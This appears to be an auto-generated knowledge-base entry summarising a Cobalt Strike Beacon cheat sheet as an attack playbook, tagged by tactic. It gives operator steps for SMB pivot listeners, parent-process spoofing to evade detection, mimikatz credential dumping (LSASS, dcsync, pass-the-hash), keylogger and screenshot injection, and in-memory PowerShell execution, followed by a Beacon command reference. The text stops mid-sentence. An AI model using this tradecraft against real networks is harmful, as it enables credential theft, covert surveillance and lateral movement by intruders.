---
title: "Trained Knowledge & Topology: Beacon.pdf"
tags:
  - credential_access
  - enumeration
  - http
  - https
  - kerberos
  - lateral_movement_routing_pivot
  - mdp
  - mimikatz
  - pdf
  - powershell
  - reconnaissance
  - trained
source_file: Beacon.pdf
doc_type: pdf
updated: 2026-10-24 00:56:56
---

# Trained Knowledge & Architecture: `Beacon.pdf`

- **Source Path:** `~/Projects/CORA/Training/Beacon.pdf` (`pdf`)
- **Extracted Technical Entities:** `http, https, kerberos, mimikatz, powershell`
- **Extracted IPs / Subnets:** `None`
- **Extracted Interfaces:** `None`
- **Linked Command Playbook:** [[commands/trained_beacon]] (`6` CEGAR-verified commands | `6` MDP transitions)

## Command & Tactic Coverage Summary
- **Total CEGAR-Verified Commands:** `6` (full executable list in [[commands/trained_beacon]])
- **Tactic Distribution:** `Credential_Access` (2), `Enumeration` (2), `Lateral_Movement_Routing_Pivot` (1), `Reconnaissance` (1)
- **Top Extracted CLI Tools:** `ls` (1), `lsadump::dcync` (1), `powershell` (1), `script` (1), `sekurlsa::logonpasswords` (1), `type` (1)

## LLM Distilled Operational Summary
### 1. Key Operational Techniques & Decision Workflows

*   **Listener Configuration**: Select payload format as `<OS>/<agent_mode>/<stager>`. For SMB lateral movement, use `windows/beacon_smb/bind_pipe`; note that the chosen port defines the named pipe name or binds a local TCP listener for actions like `bypassuac`.
*   **Process Tree Spoofing (Cobalt Strike 3.8+)**: Identify a sacrificial process (e.g., `iexplore.exe` for userland, `services.exe` for SYSTEM) and a parent process ID. Execute `ppid <ID>` followed by `spawnto <x86/x64> <C:\process\to\spawn.exe>` to simulate a normal process tree for all subsequent post-exploitation jobs.
*   **Credential Access**: Use `mimikatz` with specific prefixes: `!module::` to elevate to SYSTEM before execution, or `@module::` to use the current token. Execute `logonpasswords` for LSASS extraction, `dcsync` for domain controller hashes, and `pth` for hash injection (requires local admin).
*   **Active Monitoring**: Inject keyloggers via `keylogger [pid] <x86|x64>` or screenshots via `screenshot [pid] <x86|x64> [runtime]`. Monitor active tasks using `jobs` and terminate specific instances with `jobkill <ID>`.
*   **PowerShell Execution**: Import scripts into memory using `powershell-import [/path/to/script.ps1]`. Execute functions from the imported script using `powershell [commandlet] [arguments]`, which automatically downloads the script to a local TCP server.

### 2. Critical Command Patterns and Required Flags

*   **General Control**:
    *   `help <command>`: Display help for a specific command.
    *   `sleep [seconds] <jitter/0-99>`: Set sleep duration and jitter (0 = interactive).
    *   `clear`: Clear all current taskings.
    *   `exit`: Task the Beacon to exit.
*   **File System Operations**:
    *   `pwd`: Display current working directory.
    *   `ls <C:\Path>`: List files on a specified path.
    *   `cd [directory]`: Change working directory.
    *   `rm [file\folder]`: Delete a file or folder.
    *   `cp [src] [dest]`: Copy files.
    *   `download [C:\filePath]`: Download a file from the Beacon host.
    *   `upload [/path/to/file]`: Upload a file from the attacker machine.
    *   `downloads`: List downloads in progress.
    *   `cancel [*file*]`: Cancel a download (wildcards accepted).
*   **Network & Session Enumeration**:
    *   `help net`: Display all available `net` commands.
    *   `help net [command]`: Get detailed info on a specific `net` command.

### 3. Network Topology & Service Relationships

*   **SMB Listener Topology**: SMB Beacons communicate via named pipes through a parent Beacon pivot. The selected port

